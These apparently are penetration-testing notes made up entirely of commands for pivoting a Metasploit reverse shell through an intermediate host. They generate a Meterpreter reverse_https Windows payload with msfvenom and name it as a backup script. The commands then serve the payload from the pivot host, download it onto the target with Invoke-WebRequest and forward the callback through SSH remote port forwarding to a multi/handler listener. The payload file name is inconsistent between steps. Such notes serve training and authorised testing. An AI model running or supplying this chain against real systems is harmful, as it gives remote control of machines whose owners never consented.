- Create Windows Payload with msfvenom
```bash
 msfvenom -p windows/x64/meterpreter/reverse_https lhost= $InternalIPofPivotHost -f exe -o backupscript.exe LPORT=8080
```

- Start multi/handler
```bash
use exploit/multi/handler
set LHOST 0.0.0.0
set LPORT 8000
run
```

- Transfer payload to Pivot Host
```bash
scp ./backupjobs.exe $USER@$PIVOT_HOST
```

- Set up Python server on Pivot Host to transfer the payload to the Target
```bash
python3 -m http.server 8123
```

- Download the payload from the Target
```bash
Invoke-WebRequest -URI "http://$PIVOT_HOST_INTERNAL_IP:8123/backupjobs.exe" -OutFile "C:\backupjobs.exe"
```

- Using SSH -R to create tunnel
```bash
ssh -R $PIVOT_HOST_INTERNAL_IP:8080:0.0.0.0:8000 $USER@TARGET_IP -vN

# This use SSH remote port forwarding to forward msfconsole's listener service port on 8080 to the $PIVOT_HOST server's port 8080
-v: make the ssh verbose
-N: ask the ssh not to prompt log in shell
-R: ask the $PIVOT HOST server to listen on $TARGET:8080 and forward all traffic to msfconsole listener on 0.0.0.0:8000
```
